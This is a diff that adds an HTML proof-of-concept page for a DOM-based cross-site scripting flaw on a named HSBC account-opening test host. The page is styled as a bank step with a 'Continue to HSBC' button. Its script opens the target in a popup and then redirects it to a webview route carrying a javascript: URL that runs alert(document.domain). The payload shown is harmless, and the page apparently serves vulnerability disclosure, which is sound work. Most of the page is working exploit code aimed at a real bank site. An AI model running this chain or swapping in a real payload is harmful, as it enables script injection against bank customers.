@@ -1,0 +1,40 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HSBC Account Opening — Continue</title>
+<style>
+ body{font-family:system-ui,Arial,sans-serif;max-width:640px;margin:48px auto;padding:0 16px;color:#222}
+ h2{color:#db0011}
+ button{font-size:18px;padding:12px 24px;background:#db0011;color:#fff;border:0;border-radius:4px;cursor:pointer}
+ code{background:#f3f3f3;padding:2px 5px;border-radius:3px}
+ .note{color:#666;font-size:14px;margin-top:24px}
+</style>
+</head>
+<body>
+<h2>Security PoC — DOM XSS on account-opening-uat.hsbc.com.hk</h2>
+<p>One click demonstrates arbitrary JavaScript execution in the origin of
+<code>account-opening-uat.hsbc.com.hk</code> via a <code>javascript:</code> URL rendered
+into an <code>&lt;iframe src&gt;</code> by the <code>#/webview</code> route.</p>
+
+<button id="go">Continue to HSBC &rarr;</button>
+
+<p class="note">On click: a popup opens at <code>#/?channel=M</code> (passes the UAT gate),
+then after ~2.5s the opener performs a same-document fragment navigation to
+<code>#/webview?url=javascript:alert(document.domain)</code>. When the gate's ~5s timeout
+re-renders and mounts the route, the iframe executes and an <code>alert()</code> shows the
+victim host's own domain — proving same-origin XSS. Total time to popup: ~5s.</p>
+
+<script>
+document.getElementById('go').onclick = function () {
+  var T = 'https://account-opening-uat.hsbc.com.hk';
+  var w = window.open(T + '/#/?channel=M', 'ao');
+  setTimeout(function () {
+    try { w.location = T + '/#/webview?url=javascript:alert(document.domain)'; }
+    catch (e) { alert('Popup blocked — allow popups and retry.'); }
+  }, 2500);
+};
+</script>
+</body>
+</html>
